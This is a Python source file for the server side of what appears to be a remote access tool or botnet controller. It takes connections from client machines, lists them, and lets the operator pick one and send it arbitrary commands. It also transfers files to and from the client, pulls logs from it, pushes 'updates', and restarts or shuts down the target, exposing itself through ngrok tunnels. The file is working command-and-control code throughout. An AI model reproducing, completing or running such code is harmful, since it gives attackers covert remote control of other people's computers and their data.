from threading import Thread
import socket
import sys
import json


from config.command_map import *

from services.server_services import *
from services.ngrok import *
from services.file_transfer import *

from server.server_ui.messages import *

from utils.globals import *
from utils.proc import process_kill


class Server:
    def __init__(self, listen: int = 5) -> None:
        self.ip, self.port = HOST
        self.server: socket = None
        self.connections: list = []
        self.is_running: bool = False
        self.listen: int = listen

    def create_workers(self):
        workers = [self.accept, self.prompt]
        for worker in workers:
            Thread(target=worker).start()

    def run(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind((self.ip, self.port))
            self.server.listen(self.listen)
            self.is_running = True

        except socket.error:
            print(socket_creation_error)
            sys.exit(1)
    
    def send(self, message: str):
        self.server.send(message.encode(UTF))
    
    def recv(self):
        return self.server.recv(1024).decode(UTF)

    def stop(self):
        if self.is_running:
            self.server.close()

    def accept(self):
        for conn in self.connections:
            conn["conn"].close()

        del self.connections[:]

        while self.is_running:
            if not self.is_running:
                break

            try:
                sockaddr, addr = self.server.accept()
                hostinfo = sockaddr.recv(1024).decode(UTF)
                hostinfo = json.loads(hostinfo)
                connection_info = {"conn": sockaddr, "address": [
                    hostinfo["hostaddr"], addr[1]], "hostname": hostinfo["hostname"]}

                if hostinfo["hostname"] is not None or not hostinfo["hostname"] == "":
                    self.connections.append(connection_info)

                    sockaddr.send(ready.encode(UTF))

                    print(connection_recv_from.format(hostinfo["hostname"]))

            except Exception:
                break

    def shutdown(self):
        if self.connections:
            try:
                [
                    self.connections[i]["conn"]
                        .send(restart.encode(UTF))
                    for i in range(len(self.connections))
                ]
            except ConnectionResetError:
                self.is_running = False
                self.server.close()
    

    def list_connections(self):
        if self.connections:
            print(ls_conn_header)

            for i, conn in enumerate(self.connections):
                try:
                    conn["conn"].send(" ".encode(UTF))
                except:
                    del self.connections[i]
                    continue

            for i, conn in enumerate(self.connections):
                if len(self.connections) > 0:
                    print(ls_conn_addrs(i, conn))

        if len(self.connections) == 0:
            print(no_conn_available)
        print()

    def update_info(self):
        pid = None
        if WIN:
            _, pid = process_running("ngrok.exe")
            
        else:
            pid = get_pid_by_name("ngrok")
        
        if pid:
            ip, port = get_ngrok_tunnels()
            if ip and port:
                set_server_conn(ip, port, True)

    def prompt(self):
        ngip, ngport = get_ngrok_tunnels()
        help(ngip, ngport)
        while self.is_running:
            command = str(input("@server >> "))

            if command is None:
                self.prompt()

            if command in ['list', 'ls']:
                clear()
                self.list_connections()

            if command == help:
                help()

            if command == cls or command == clear:
                clear()

            if select in command or "." in command:
                target = self.select_target(command)
                if target is not None:
                    clear()
                    self.send_commands(target)

            if update_server in command:
                if WIN:
                    ngrok_path = os.path.isfile(
                        os.path.join(os.getcwd(), "ngrok.exe"))
                    ngrok_temp_path = os.path.isfile(
                        os.path.join(os.environ["TEMP"], "ngrok.exe"))

                    if ngrok_path or ngrok_temp_path:
                        ip, port = get_ngrok_tunnels()
                        if ip is not None and port is not None:
                            set_server_conn(ip, port)
                    else:
                        print("[-] Failed updating: 'ngrok.exe' not found")
                else:
                    self.update_info()

            if command == "exit":
                print("Quiting server..")
                self.shutdown()
                pid = None
                if WIN:
                    _, pid = process_running("ngrok.exe")
                else: 
                    pid = get_pid_by_name("ngrok")

                if pid:
                    process_kill(pid)

                self.is_running = False
                self.stop()
                break


    def send_commands(self, target: dict, target_response: str = None):
        if self.is_running:
            try:
                command = None
                if target_response is not None:
                    command = str(input(f"{target_response}>> "))
                else:
                    command = str(input(f"{target['hostname']} >> "))

                if not command or command == "":
                    self.send_commands(target)

                elif cls in command:
                    clear()
                    self.send_commands(target)

                elif exit in command:
                    return

                elif shutdown in command:
                    self.shutdown_target(target)
                    return

                elif restart in command:
                    target["conn"].send(command.encode(UTF))
                    del self.connections[self.connections.index(target)]
                    return

                elif upload in command:
                    file_upload(command, target["conn"])
                    self.send_commands(target)

                elif download in command:
                    file_download(command, target["conn"])
                    self.send_commands(target)

                elif dumplog in command:
                    get_logs_from_client(target["conn"], command)
                    self.send_commands(target)

                elif send_update in command:
                    update_name = input("update path/name: ").strip()
                    command = command.replace(send_update, "").strip()
                    command = f"upload {update_name}"
                    print("[+] Sending Update: ", update_name.split('\\')[-1])
                    file_upload(command, target["conn"])
                    self.send_commands(target)

                elif command not in commands:
                    target["conn"].send(command.encode(UTF))
                    data = target["conn"].recv(1024*1024).decode(UTF)
                    self.send_commands(target, data)

            except ConnectionAbortedError:
                print("[-] Failed: connection closed")
                return

            except ConnectionResetError:
                print("[-] Failed: connection closed")
                return

    def shutdown_target(self, target: dict):
        for i, conn in enumerate(self.connections):
            if conn == target:
                target["conn"].send(shutdown.encode(UTF))
                del self.connections[i]
    
    def select_target(self, command: str) -> dict:
        if self.connections:
            if "select" in command:
                target_id = int(command.replace("select", "").strip())
                return self.connections[target_id-1]
            if "." in command:
                return self.connections[0]